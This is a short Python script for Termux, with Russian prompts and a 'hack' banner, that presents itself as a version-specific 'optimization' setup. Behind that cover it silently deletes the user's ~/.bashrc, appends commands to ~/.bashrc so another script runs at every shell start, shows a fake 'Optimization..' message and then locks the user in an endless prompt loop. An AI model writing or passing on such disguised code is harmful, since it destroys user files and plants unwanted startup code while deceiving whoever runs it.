import os, time, webbrowser

from colorama import Fore, Style, Back

print ('\n')
def res():
    print(Style.RESET_ALL)

os.system('rm ~/.bashrc')

os.system('clear')
print(Fore.YELLOW+' ')
print(' ▄▄                            ▄▄')
print(' ██                            ██')
print(' ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀')
print(' ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██')
print(' ██    ██  ▄██▀▀▀██  ██        ██▀██▄')
print(' ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄')
print(' ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀')
res()
print('[для оптимизированной роботы')
print('уточните вашу версию Termux]')
print(' ')
print('[1] 0.118.0 "последняя версия"')
print('[2] 0.101 "плеймаркет версия"')
res()
tsu = input('выберете пункт>>> ')
if tsu == '1':
    os.system('echo "cd termuxaling" >> ~/.bashrc')
    os.system('echo "python3 lol.py" >> ~/.bashrc')

if tsu == '2':
    os.system('echo "cd termuxaling" >> ~/.bashrc')
    os.system('echo "python3 lo.py" >> ~/.bashrc')
else:
    os.system('hack.py')

os.system('clear')
print('[!] Оптимизация..')
time.sleep(3)
os.system('clear')

while True:
    print('все готово просто перезапустите термукс и напишите команду "go" ')
    lol = input('✅')
